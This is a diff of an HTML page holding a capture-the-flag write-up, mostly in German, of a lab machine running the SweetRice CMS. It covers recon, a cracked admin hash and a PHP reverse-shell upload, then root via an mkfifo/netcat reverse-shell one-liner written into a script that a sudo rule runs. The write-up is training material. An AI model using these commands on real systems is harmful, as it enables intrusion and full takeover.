@@ -1,72 +1,69 @@
-	<html>
-		
+<html>
 		<h1>recon</h1>
 		<h2>NMAP</h2>
 		
-		nmap -sC -sV -oA nmap/initial {IP der box}
-
+		nmap -sC -sV -oA nmap/initial {IP der box}<br>
 		<h3>Ergebnis</h3>
-		22 ssh
-		80http
-
+		22 ssh<br>
+		80http<br>
 		<h2> HTTP anschauen </h2>
-
-		Apache default page... 
-
+<br>
+		Apache default page... <br>
+<br>
 		<h3> Gobuster </h3>
-
-		gobuster dir -u http://{IP der box}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
+<br>
+		gobuster dir -u http://{IP der box}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>
+<br>
 		<h3> Ergebnis </h3>
-
-		/content 301
-
+<br>
+		/content 301<br>
+<br>
 		<h3> /content anschauen </h3>
-
+<br>
 		<p>	
-			Welcome to SweetRice - Thank your for install SweetRice as your website management system.
-			This site is building now , please come late.
-
-			If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting
-
-			and uncheck the checkbox "Site close" to open your website.
-
-			More help at Tip for Basic CMS SweetRice installed
+			Welcome to SweetRice - Thank your for install SweetRice as your website management system.<br>
+			This site is building now , please come late.<br>
+<br>
+			If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting<br>
+<br>
+			and uncheck the checkbox "Site close" to open your website.<br>
+<br>
+			More help at Tip for Basic CMS SweetRice installed<br>
 		</p>
-
-		scheint ein CMS zu sein
-
+<br>
+		scheint ein CMS zu sein<br>
+<br>
 		<h2> searchsploit </h2>
-
-		searchsploit sweetrice
-
-		SweetRice 1.5.1 - Backup Disclosure
-
-		mysql einfach cat -&gt; pw hash
-
-		admin: manager
-
-		pw: 42f749ade7f9e195bf475f37a44cafcb
-
-		MD5 cracken -&gt; Password123
-
+<br>
+		searchsploit sweetrice<br>
+<br>
+		SweetRice 1.5.1 - Backup Disclosure<br>
+<br>
+		mysql einfach cat -&gt; pw hash<br>
+<br>
+		admin: manager<br>
+<br>
+		pw: 42f749ade7f9e195bf475f37a44cafcb<br>
+<br>
+		MD5 cracken -&gt; Password123<br>
+<br>
 		<h2> gobuster auf content </h2>
-
-		gobuster dir -u http://{IP der box}/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-
-
-		/images (Status: 301) - images
-
-		/js (Status: 301) - JS
-
-		/inc (Status: 301) - File acces
-		/as (Status: 301) - login
-		/_themes (Status: 301) - Files
-		/attachment (Status: 301) - File access
-
+<br>
+		gobuster dir -u http://{IP der box}/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>
+<br>
+<br>
+<br>
+		/images (Status: 301) - images<br>
+<br>
+		/js (Status: 301) - JS<br>
+<br>
+		/inc (Status: 301) - File acces<br>
+		/as (Status: 301) - login<br>
+		/_themes (Status: 301) - Files<br>
+		/attachment (Status: 301) - File access<br>
+<br>
 		<h2> exploitation </h2>
-
+<br>
 		<ol>
 		<li>mit credentials bei content/as einloggen</li>
 		<li>zu ads wechseln</li>
@@ -79,51 +76,51 @@
 		<li>speichern</li>
 		<li>unter {IP}/content/inc/ads/ file finden und ausfuerhen</li>
 		</ol>
-
-		now that we have code execution we ship our reverseshell
-
-		https://github.com/pentestmonkey/php-reverse-shell
-
-		ip mit eigener (tun0) ersetzen und text in Werbung kopieren
-
-		listener starten (nc -lvnp 1234)
-
-		we got a remote shell
-		
+<br>
+		jetzt da wir code execution haben shippen wir unsere remote shell<br>
+<br>
+		https://github.com/pentestmonkey/php-reverse-shell<br>
+<br>
+		ip mit eigener (tun0) ersetzen und text in Werbung kopieren<br>
+<br>
+		listener starten (nc -lvnp 1234)<br>
+<br>
+		we got a remote shell<br>
+		<br>
 		<h2> post exploitation </h2>
-		
+		<br>
 		<h3> upgrade the shell </h3>
-
-		python -c 'import pty; pty.spawn("/bin/bash/")'
-
-		ctrl + z
-
-		stty raw -echo
-
-		fg
-
-		reset
-
-		should work (i got asked what terminal i run, i entered xterm then)
-
+<br>
+		python -c 'import pty; pty.spawn("/bin/bash/")'<br>
+<br>
+		ctrl + z<br>
+<br>
+		stty raw -echo<br>
+<br>
+		fg<br>
+<br>
+		reset<br>
+<br>
+		sollte laufen (ich wurde gefrage, welches Termin ich nutze. Ich hab dann xterm eingetragen)<br>
+<br>
 		<h3> privesc </h3>
+<br>
+		sudo -l<br>
+<br>
+		User www-data may run the following commands on THM-Chal:<br>
+		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl<br>
+<br>
+		cat /home/itguy/backup.pl<br>
+<br>
+		hier wird eine andre Datei ausgefuehrt /etc/copy.sh<br>
+<br>
+		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {your IP} 9002 >/tmp/f" > /etc/copy.sh<br>
+<br>
+		nc -lvnp 9002<br>
+<br>
+		sudo perl /home/itguy/backup.pl<br>
+<br>
+		und wir sind root<br>
 
-		sudo -l
-
-		User www-data may run the following commands on THM-Chal:
-		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
-
-		cat /home/itguy/backup.pl
-
-		this file calls another file /etc/copy.sh
-
-		echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {your IP} 9002 >/tmp/f" > /etc/copy.sh
-
-		nc -lvnp 9002
-
-		sudo perl /home/itguy/backup.pl
-
-		and we are done
-
-
+<br>
 </html>
